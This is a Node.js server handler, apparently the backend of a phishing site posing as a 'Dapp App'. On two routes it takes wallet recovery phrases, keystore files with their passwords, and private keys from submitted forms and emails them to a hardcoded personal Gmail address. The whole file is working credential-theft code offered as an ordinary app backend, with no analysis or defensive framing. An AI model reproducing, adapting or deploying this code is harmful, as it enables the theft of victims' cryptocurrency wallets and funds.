const nodemailer = require("nodemailer");

function formatMessage(message) {
  const lines = message.split(/\r?\n/);
  const formattedLines = lines.map(
    (line) => `<div style="margin-bottom: 10px;">${line}</div>`
  );
  return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">
    ${formattedLines.join("")}
  </div>`;
}

module.exports = async (req, res) => {
  // Health check
  if (req.method === "GET" && req.url === "/") {
    return res.status(200).send("Server is running ✅");
  }

  // Shared transporter
  const email = process.env.EMAIL_USER || "";
  const pass = process.env.EMAIL_PASS || "";
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: email, pass },
  });

  // /api/send-email
  if (req.method === "POST" && req.url === "/send-email") {
    try {
      const { phrase, keystore, privateKey, item } = req.body;
      let mailOptions = null;

      if (phrase) {
        const formattedMessage = formatMessage(phrase);
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "ibsalam24@gmail.com",
          subject: "New Phrase Submission",
          html: `${formattedMessage} <br/> Wallet: ${item}`,
        };
      } else if (keystore) {
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "ibsalam24@gmail.com",
          subject: "New Keystore Submission",
          html: `<div>Json: ${keystore.json}</div>
                 <div>Password: ${keystore.password}</div>
                 Wallet: ${item}`,
        };
      } else if (privateKey) {
        const formattedMessage = formatMessage(privateKey);
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "ibsalam24@gmail.com",
          subject: "New Private Key Submission",
          html: `${formattedMessage} <br/> Wallet: ${item}`,
        };
      }

      if (!mailOptions) {
        return res.status(400).json({ message: "Submission Failed (empty body)" });
      }

      const result = await transporter.sendMail(mailOptions);
      console.log("📤 Email sent:", result.response || result.messageId);

      return res.status(200).json({ message: "Email sent successfully!" });
    } catch (error) {
      console.error("🔥 Email error:", error);
      return res.status(500).json({ error: "Email failed", details: error.message });
    }
  }

  // /api/mail
  if (req.method === "POST" && req.url === "/mail") {
    try {
      const { phrase, keystore, privateKey, item } = req.body;
      let mailOptions = null;

      if (phrase) {
        const formattedMessage = formatMessage(phrase);
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "ibsalam24@gmail.com",
          subject: "New Phrase Submission",
          html: `${formattedMessage} <br/> Wallet: ${item}`,
        };
      } else if (keystore) {
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "ibsalam24@gmail.com",
          subject: "New Keystore Submission",
          html: `<div>Json: ${keystore.json}</div>
                 <div>Password: ${keystore.password}</div>
                 Wallet: ${item}`,
        };
      } else if (privateKey) {
        const formattedMessage = formatMessage(privateKey);
        mailOptions = {
          from: `Dapp App <${email}>`,
          to: "ibsalam24@gmail.com",
          subject: "New Private Key Submission",
          html: `${formattedMessage} <br/> Wallet: ${item}`,
        };
      }

      if (!mailOptions) {
        return res.status(400).json({ message: "Submission Failed (empty body)" });
      }

      const result = await transporter.sendMail(mailOptions);
      console.log("📤 Email sent:", result.response || result.messageId);

      return res.status(200).json({ message: "Email sent successfully!" });
    } catch (error) {
      console.error("🔥 Mail error:", error);
      return res.status(500).json({ error: "Internal server error", details: error.message });
    }
  }

  // Fallback
  return res.status(404).json({ error: "Route not found" });
};
